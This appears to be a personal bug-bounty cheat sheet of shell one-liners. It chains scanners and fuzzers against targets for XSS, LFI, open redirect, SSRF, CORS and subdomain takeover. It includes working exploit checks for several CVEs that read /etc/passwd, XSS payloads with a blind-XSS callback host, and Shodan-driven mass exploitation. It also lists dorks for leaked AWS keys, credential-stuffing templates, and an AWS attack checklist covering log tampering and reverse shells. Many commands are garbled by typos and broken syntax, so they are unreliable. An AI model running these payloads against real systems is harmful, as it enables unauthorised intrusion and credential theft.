   shodan search --flieds ip_str product organization country --separator, "product apache" | awk -F, "{print $1}" | nucliei -t templetes/http-vulns.yml -1
   
   using gospider, assetfinder , amass and nuclei
   
   amass enum -passive -d example.com -o amass_output.txt && gospider -S targets.txt -q -o gospider_output.txt && cat gospider_output.txt | awk -F '[/:]' '{print $4}' | sort -u | assetfinder -subs-only | sort -u | nuclei -t -t templates/subdomain-takeover.yaml -1 -o nuclei_results.txt
   
   
   search for SSRf using subfinder, httpx and qsreplace
   subfinder -d example.com | qsreplace 'http://localhost' 'fuzz' | httpx -silent - threads 10 -status-code 200
   
   
   using chaos, gospider, findomain, assetfinder, amass, httpx and anew for recon domain
   
   chaos -d example.com | gospider -s https://example.com | findomain -t example.com | assetfinder | amass intel -d example.com | hpptx -silent -thread 10 -status code 200 | anew | sort -u 


    ONELINER-SCRIPT-FOR-BUG-BOUNTY                  ONELINER-SCRIPT-FOR-BUG-BOUNTY                ONELINER-SCRIPT-FOR-BUG-BOUNTY
   
   
   onliner search for xss using kxss, xargs and httpx
   
   kxss example.com | xargs -1 % sh -c " echo '<script> alert(1)</script>' | httpx - silent -body-string @- -status-code 200 %"
   
   onliner find xss using subfindeer,httpx,katana,gxss, kxss,nad dalfox
   subfinder -d example.com | httpx -silent -threads 10 -status-code 200 | katana -query-params | gxss |kxss | dalfox pipe
   
   domian eneumeration and discovery files using ffuf, httpx, and findomain
   ffuf -w /path/to/wordlist -u https://target/FUZZ -e .html, php -mc all -mc 200, 204,301,307 -o output.txt -of json -sc 200 -t 100 -timeout 20s
   
   oneliner  find open redirct unsing waybackurls, httpx,gf, anew and nuclei
   waybackurls target.com | httpx- silent |grep "location" | anew | nuclei -t /path/to/open-redirect-templetes-silent
   
   gf openredirct target.com | anew | nuclei -t /path/to/open-redirect-templetes-silent
   
   
   online to complet numeration of xss, lfi, ssrf in domain using gauplus, anwe,gxss,gf , httpx, and secretfindeer
   gau target.com | plus | anew | gxss -xss | gf -lfi -ssrf | qsreplace -r target.com -s target.com | httpx - silent | secretfinder -silent
   
   oneliner check cloudfarebusing subfinder, dnsx, cf-check, naabu
   subfinder -d target.com -silent | dnsx-silent | cf -check | naabu -silent
   
   onliner recon subdomian using assetfinder, httpx,xargs, waybackurls and nuclie vulnerbiltiy scan
   assetfinder target.com | httpx -silent | xargs -1 {} sh -c 'waybackurls {} | nuclei -t /path/to/vunearblity-templates - silent'
   
   oneliner extract js using haktrails, httpx, getjs, anew, tojson
   hactrails target.com | httpx -title -follow-redirects -silent-content-length-threads 100 -timeout 20s -retries 3 -o output.txt -mc all -mc 200,204,302,307 -wl /path/to/wordlist  -ac -acme-dns -acme-dns-timeout 10s -acme-dns-challage dns-01 -acme-dns-credentails "/path/to/credentails json" |getjs -silent | anew | tojson
   
   
   oneliner LFI using gau, gf, qsreplace and xargs
   
   gau target.com | gf lfi | qsreplace -r target..com -s target.com | xargs -1 {} sh -c 'curl -s {} | grep -i  "root:x:0:0:root:/root:/bin/bash"
   
   
   
   

  Open Redirect Oneliner:
cat waybackurls_result.txt|grep -a -i \=http|qsreplace 'http://evil.com'|while read host do;do curl -s -L $host -I|grep "evil.com" && echo "$host \033[0;31m[+]VULNERABLE-TO-OPEN-REDIRECT-ATTACK\n";done
  
 
 Blind XSS Oneliner:
echo testphp.vulnweb.com|gau -subs|grep "https://" |grep -v "png\|jpg\|css\|js\|gif\|txt"|grep "="|uro|dalfox pipe --deep-domxss --multicast --blind akshayravi0479.xss.ht


Content Discovery With Dirsearch Oneliner:
dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -u http://target


  


XSS Scanner
echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq

gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt

waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt

cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"

XSS Payloads:
xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
"/><details/open/ontoggle=promt(1)>

"onfocus="alert(1)"autofocus="abc

     LOCAL FILL INCLUSION
   gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
   
   Open-redirect
   export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
   cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
   
   
   Prototype Pollution
   subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
   
   CVE-2020-5902    CVE-2020-5902       CVE-2020-5902
   shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
   
   
   CVE-2020-3452       CVE-2020-3452      CVE-2020-3452
   while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
   
   CVE-2022-0378    CVE-2022-0378    CVE-2022-0378
   
   cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
   
   


   
   
   Subdomain Bruteforcer with FFUF
   ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
   
   Extract IPs from a File
   grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
   
   Create Custom Wordlists
   gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txt
   
   cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt  
   
   

    
    Find Subdomains TakeOver
    subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
    
    
    Dump Custom URLs from ParamSpider
    
    cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
    
    
    EXTRACT ENDPOINTS FROM SWAGGER.JSON
    curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
    
    
    CORS Misconfiguration
    site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done
    
    
    Find Hidden Servers and/or Admin Panels
    
    ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
    
    
    COMMAND THAT (TO BE EXECUTED ONCE A MONTH -MORE OR LESS
    
    today=$(date '+%Y-%m-%d'); cat subdomains.txt | httpx -follow-redirects -json -silent | tee active_subdomains_$today.json | jq -r '[.url,.content_length,.title,.host,.status_code] | @csv' | tee urls_modified_raw_$today.csv | anew -d urls_modified_raw_old.csv | cut -d',' -f1 | sed 's/"//g' | ./program active_subdomains_clean_$today.csv active_subdomains_clean_old.csv | tee urls_modified_clean_$today.txt | nuclei -silent -exclude-severity info,low | tee nuclei_urls_modified_$today.txt | notify; cp urls_modified_raw_{$today,old}.csv


   

         MASS-HUNTING-FOR-LEAKED-SENSITIVE-DOCUMENTS-FOR-BIG-BOUNTIES      MASS-HUNTING-FOR-LEAKED-SENSITIVE-DOCUMENTS-FOR-BIG-BOUNTIES
         https://infosecwriteups.com/mass-hunting-for-leaked-sensitive-documents-for-big-bounties-722cdd5ac3bb
         
         curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r > targets.txt                                                    
                                                      | 
         This bash one-liner will curl a public bug bounty program list, filter programs which include bounty, select only domains from parameters and saves the output into targets.txt file
       
          or you can use this  https://github.com/sw33tLie/bbscope
    Hackerone  
  bbscope h1 -a -u <username> -t <token> -b > bbscope-h1.txt
  
  Bugcrowd
  bbscope bc -t <token> -b > bbscope-bc.txt
  
  Note: Manually inspect all findings and add them to targets.txt for the domains without wildcards, and to the targets-wildcards.txt — domains with wildcards.
  
  curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/domains.txt" | anew targets.txt

curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt" | anew target-wildcards.txt
  
  

   sudo apt-get install poppler-utils

  [{
  "command":"for i in `cat input | gau --subs --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200`; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done", "ext":"txt" 
}]

  axiom-scan targets-wildcards.txt -m gau-pdfs -anew pdf-leak-findings.txt
  If you want to use it on targets without subdomains included, it is required to modify the module by removing -subs flag:
  [{
  "command":"for i in `cat input | gau --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200`; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done", "ext":"txt"
}]

  ~/.axiom/modules/gau-pdfs.json
  axiom-scan targets.txt -m gau-pdfs -anew pdf-leak-findings.txt
  
  
 
  AWS  AND CLOUD TOOLS                          AWS  AND CLOUD TOOLS                               AWS  AND CLOUD TOOLS
  https://3bodymo.medium.com/how-i-earned-by-amazon-s3-bucket-misconfigurations-29d51ee510desite:*.*.*.redacted.com
  https://satyasai1460.medium.com/how-js-file-helped-me-to-find-and-exploit-aws-access-key-and-secret-e09b4219831d
  https://medium.com/bug-bounty-hunting/aws-top-10-vulnerabilities-fe5fa93bac64                      check  all  the aws top 10 if found your client using it // check for the labs and solve it 
  
  https://github.com/mosesrenegade/PMapper
  For Amazon S3 buckets, try the “AWSBucketDump” tool by Jordan Potti  https://github.com/jordanpotti/AWSBucketDump 
For DigitalOcean Spaces, try the “Spaces-Finder” tool by Appsecco: https://github.com/appsecco/spaces-finder 

For GCP Storage, try the “GCPBucketBrute” tool by RhinoSecurityLabs:   https://github.com/RhinoSecurityLabs/GCPBucketBrute

 For Azure Storage, try the “MicroBurst” tool by NetSPI: https://github.com/NetSPI/MicroBurst 
  
  
  
  
  AWS S3 CLI Cheat sheet
  check this write-up     https://infosecwriteups.com/mass-hunting-for-misconfigured-s3-buckets-99e5f158cdc0
  Listing objects in S3 bucket:     aws s3 ls s3://bucket-name
  Uploading an Object : aws s3 cp /path/to/local/file s3://bucket-name/path/to/s3/key
   Downloading an Object:  aws s3 cp s3://bucket-name/path/to/s3/key /path/to/local/file
   Removing an Object: aws s3 rm s3://bucket-name/path/to/s3/key

  curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".programs[] | select(.bounty==true) | .name,.domains[]" -r > base_wordlist.txt
  Also, it is required to format base wordlist to remove special and uppercase characters:
  cat base_wordlist.txt | tr '[:upper:]' '[:lower:]' | sed "s/[^[:alnum:].-]//g" | sort -u > tmp
mv tmp base_wordlist.txt
    
    https://github.com/nahamsec/lazys3.git
  
  
  A quick way to scan for the s3 bucket list:
s3scanner -bucket-file s3-buckets.txt -threads 16 | grep -aE 'Read|Write|Full' | tee results.txt




     𝗔𝗪𝗦 𝗢𝗦𝗜𝗡𝗧 𝗯𝘆 𝗗𝗼𝗿𝗸𝗶𝗻𝗴 🎩

=Shodan Dorks
html:"AWS_ACCESS_KEY_ID"
html:"AWS_SECRET_ACCESS_KEY"
html:"AWS_SESSION_TOKEN"
title:"AWS S3 Explorer"
html:"AWS Elastic Beanstalk overview"
html:"OpenSearch Dashboards"
"X-Amz-Server-Side-Encryption"


  intext:target inurl:s3.amazonaws.com
  Azure Blob Storage: intext:target inurl:blob.core.windows.net
  Google Cloud Storage: intext:target inurl:storage.googleapis.com


    Example Google Dorking Syntax
site:websitename.com inurl:".s3.amazonaws.com"

site:websitename.com inurl:"storage.googleapis.com"

 AWS Access Key 

 ./enumerate-iam.py — access-key AKIA… — secret-key StF0q…
 
 
 credentail-stuffing-in clound-services
 nuclei -t credential-stuffing/self-hosted/gradana.yaml -uncover -uncover-limit 500 -var username -var password=admin
 
 nuclei -u https://jira.projectdiscovery.io/ -t jira.yaml -var username=testing@projectdiscovery.io -var password=test123 
 cat jira_host.txt | nuclei -var username=email.txt -var password=pass.txt -t jira.yaml -attack-type clusterbomb


  tip  tip
   /aws-s3-bucket-versioning-discloses-secrets-      in web app                       https://osintteam.blog/aws-s3-bucket-versioning-discloses-secrets-1d63fbe498ab
   
     nmap -sVC -p- -T4 16.171.123.169 -vv
         aws s3 ls s3://<BUCKET_NAME> --no-sign-request [Anonymous Access]
         aws s3api list-object-versions --bucket huge-logistics-dashboard --query "Versions[?VersionId!='null']" --no-sign-request
         aws s3api get-object --bucket huge-logistics-dashboard --key "static/js/auth.js" --version-id "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh" old_auth.js --no-sign-request
         aws configure
aws sts get-caller-identity [Checking Identity]

  tip on finding s3 bucket
 1  A simple way to detect an S3 bucket is by examining the URLs associated with its files. When you encounter a file URL like
https://<bucket-name>.s3-us-west-1.amazonaws.com/uploads/image.png
, you can extract the base URL
https://<bucket-name>.s3-us-west-1.amazonaws.com
and browse the corresponding folder at
https://<bucket-name>.s3-us-west-1.amazonaws.com/uploads/.
This method allows you to visually explore the contents of the bucket using a web browser.

2  visit   https://buckets.grayhatwarfare.com/results/colliershouston
By searching for an organization's name, you can filter and browse through the contents of their open S3 buckets. This approach is valuable for research and identifying exposed data.

3 use aws cli tools


   tip  using burpsuite
    capturing the request made when downloading a file:

Access the website and initiate the download of the file (e.g., by clicking an image link). Burp Suite will intercept the request.
Inspect the captured request in Burp Suite’s Proxy tab, analyzing the headers and URL to determine the source of the file.
Look for indications within the request that suggest the file is being served from an S3 bucket, such as a URL containing “s3.amazonaws.com” or any custom domain associated with an S3 bucket.
Inspect the response in Burp Suite’s Proxy tab, examining the headers and content to confirm if it is indeed being served from an S3 bucket.

  using  
   subfinder -d disney.com -all -silent | httpx -silent -webserver -threads 100 | grep -i AmazonS3

subfinder -d disney.com -all -silent | httpx -silent -webserver -threads 100 -match-string "AccessDenied"

use nuclie template 
   https://github.com/projectdiscovery/nuclei-templates/blob/master/technologies/s3-detect.yaml
  

  






             AWS PENETRATION TESTING CHECKLIST

1-Test for Unauthenticated Bucket Access
2-Test for Semi-Public Bucket Access - Improper ACL permission
3-Targeting and compromising AWS Access keys in git commit
4-Test for Extracting keys from an EC2 instance
5-Exploiting AWS Security Misconfigurations
6-Test to exploit EC2 instance
7-Exploiting Internal AWS Services using Lambda backdoors
8-Test for Subdomain Takeover
9-Testing for AWS IAM Privilege Escalation
10-Test for RCE attack
11-Test for AWS Role Enumeration (IAM)
12-Test for EC2 service to exploit privilege escalation
13-Test for AWS Role enumeration - Bypassing CloudTrail Logging
14-Test for Bitbucket Server data for credentials in AWS
15-Test for rebinding to compromise the cloud environment
16-Test for Change of local Windows / Linux logs
17-Test to create jobs or serverless actions to add root certificates and ssh private keys to machines and users (such as AWS lambda)
18-Test to Create an additional interface / assign an IP address in target network / subnet on a compromised machine (like assigning a secondary private IPv4 address or interface to an AWS EC2 instance
19-Steal virtual machine images from storage accounts, analyze them for passwords, keys and certificates to access live systems (like VM VHD snapshots from storage accounts)
20-Test to Gain OS level access to Instances/VMs via workload management service privileges (AWS SSM)
21-Create systems management commands or abuse instance metadata for scheduled and triggered command and control (AWS systems manager, modify EC2 UserData to trigger a reverse shell)
22-Test to Run or deploy a workload with an assigned/passed service or role, export instance credentials for other privileges (such as EC2 passed role and meta credentials)
23-Fingerprint server and application versions and frameworks, detect sensitive PII in application logs
24-Test for CSV injection in AWS CloudTrail
25-Tested for AWS service abuse via meta-data
26-Attempt load balancer MITM for session hijacking (elb) by cloud service configuration or load instance compromise
27-Steal credentials from metadata of proxy or http forwarding servers (credentials in AWS meta
28-Steal cloud workload credentials (AWS metadata SSM or Azure Linux Agent (waagent) folder credentials
29-Steal credentials from or leverage privilege to operation of a cloud key service (aws kms, azure key vault
30-Alter data in datastore for fraudulent transactions or static website compromise (s3, rds, redshift)
31-Alter a serverless function, logic app or otherwise as business logic implementation for action on objective or escalation (AWS lambda or Azure logic apps)
32-Alter data in local sql or mysql databases
33-Operate in regions where logging is not enabled or disable global logging (like CloudTrail)
34-Alter log files in a non-validated log store or disable validation (like cloud trail log validation)
35-Tested for Disable network traffic analysis / logging (VPC flowlogs)
36-Test for Disable Cloud alerting to prevent detection and response (like cloudwatch alerts, GuardDuty, Security Hub, or Azure Security Center)
37-Tested for Disable data store access logging to prevent detection and response (cloudtrain data access, s3 access logging, redshift user activity)
38-Alter log retention or damage the integrity of logs (s3 lifecycle, kms decryption cmk key deletion/role privilege lockout)
39-Process hooking, process injection, windows access token manipulation, leveraging misconfigured sudo capabilities
40-Test to Create or reset a login, access key or temporary credential belonging to a high privilege user (like iam
, sts or iam
)
41-Test to Change the default policy for a user or new users to include additional privileges (like setdefault-policy-version)






      LLM HACKING       LLM HACKING        LLM HACKING

 






   tip tip
   1 Discovered dead subdomains? Save them to a file, collect the IPs of live subdomains and use VhostFinder to enumerate virtual hosts. This can help expand the attack surface!
    smart.facebook.com    ->>  dead subdomain
    business.facebook.com    ->>  alive subdomain with 8.68.8.8 as ip
    
    vhostfinder ip 8.86.8.8  -wordlist deaddobdomain.com
    
   2) Found an obscure subdomain pointing you to a login page? Try to make a POST request to a register endpoint. Perhaps they forgot to disable it and you may be able to use this to continue testing! 
   
   3️⃣ Found a target that is using Akamai as a CDN and doesn’t have a login functionality? Sometimes you can perform cache poisoning by adding illegal headers! 
   request
   Get /admin?bustcache= always  http 1:1
   host: smart.com
   ::\
   reponse
   http/2 400 bad request
   how akamia should cach it 
   server-timing: cdn-cache; desc = HIT
   
 4 Find blind XSS whilst hunting by changing your User-Agent to an XSS payload using a match/replace rule in Burpsuite. If you’re lucky, you get a pingback someday!



    tip on find critical vulnerability
 1 I went to Shodan (or easy searching with http://certs.io)

Searched for my target with the filter:

> ssl.cert.subject\.cn:*.example[.]com

I found a server with a certificate for:

*.apps.███\.com

If I see wildcards, I think that the server is an ingress endpoint 
 
$ curl https://██ -H "Host: invalid12345.apps.███\.com"

Response:

> 404 Not Found: Requested route ('invalid12345.apps.███\.com') does not exist.

I brute-forced the host header with ffuf:

$ ffuf -u https://██ -H "Host: FUZZ.apps.███\.com" -mc all -fw 9

 And lots of results.

After filtering through them, I came across this:

spl-api.apps.███\.com

What's on this host? Time to try to find endpoints on this API.

$ ffuf -u https://LOADBALANCER/FUZZ -H "spl-api.apps.███\.com" -mc 200

I found the endpoint  "/v2/api-docs" which responded with an OpenAPI specification.

These contain API routes definitions:

• Where they are.
• What they accept (HTTP method, params)
 One endpoint stuck out:

"/spl/api/teardown/file"

It accepted a query parameter: "fileName".

Let's see if it's vulnerable to file disclosure?

$ curl "https://LOADBALANCER/spl/api/teardown/file?fileName=/etc/passwd" -H "spl-api.apps.███\.com"

Response:

> File not found


What if I tried traversing back with "../"

The app might be joining paths like:

> path.Join("/documents", fileName);

Let's try it:

$ curl "https://LOADBALANCER/spl/api/teardown/file?fileName=../../../../../etc/passwd" -H "spl-api.apps.███\.com"

8/ It worked!

The application responded with the contents of /etc/passwd

An easy path traversal just by finding attack surface others hadn't.


• Found a server that had a wildcard certificate
• Brute-forced Host headers with FFUF
• Found an API, then found /v2/api-docs
• Discovered an endpoint that had a parameter "fileName"
• Tried path traversal and it worked.


      art-of-monitoring-bug-bounty-programs
        
        
        
        
        First off all, is portscan in scope? If yes, portscan
Look for webservers
Try to find subdomains 
Try to find other webservers on said server
Try to do content discovery
Try to do dorking on found from before
Try to find anything on github related
Try to take screenshots with something like aquatone
Try to look at any kind of custom login pages, try content discovery more
Try to look for any register on site and IDOR
Try to look for XSS by having '"><img src=x>${{7*2}} at the very least in every field where possible
Try to look for SQLi with same and looking out of SQL errors
You can use these to fuzz the fu--ers
Try to check all CSRF tokens on forms where they need be or generally set and verify it is checked
Change GET to POST and reverse or try PUT or DELETE on endpoint
NoSQLi? XXE? 
Any open redirects? 
Throw some LFI and RFI in the mix! 
And the best of all? Business logic! 

Found an API?! YES! LETS GO!! 
Stay tuned for my API hacking post and let me know what I missed <3
        
        
        
        EXCEPT   EXCEPT                              TRY SQL ,XSS,SSRF ON THIS HEADERS
        
        
        "Cookie": "test{payload}",
"User-Agent": "test{payload}",
"Location": "test{payload}",
"Origin": "test{payload}",
"Referer": "test{payload}",
"Profile": "test{payload}",
"X-Host": "test{payload}",
"Via": "test{payload}",
"True-Client-IP": "test{payload}",
"X-Forwarded-For": "test{payload}",
"Forwarded": "for=spoofed;{payload}",
"X-Wap-Profile": "test{payload}",
"Destination": "test{payload}",
"Contact": "test{payload}",
"X-Originating-IP": "test{payload}",
"X-Original-URL": "test{payload}",
"Client-IP": "test{payload}",
"X-HTTP-DestinationURL": "test{payload}",
"API-Version": "test{payload}",
"Proxy": "test{payload}",
"Referrer": "test{payload}",
"CF-Connecting_IP": "test{payload}",
"X-Forwarded-Proto": "test{payload}",
"Proxy-Host": "test{payload}",
"From": "test{payload}",
"Client-IP": "test{payload}",
"X-Forwarded-Server": "test{payload}",
"X-Arbitrary": "test{payload}",
"X-Real-IP": "test{payload}"

   
   
   
      get all bbp 
      bbscope bc -E "your_bugcrowd_email" -P "your_bugcrowd_password" -o u | tee bugcrowd-scope.txt
        
       
        
        
        check this
        Mastering Ghauri all techniques bypass
3.Mastering SQLMAp all tampers and swithes




     google vrp  disclse report 
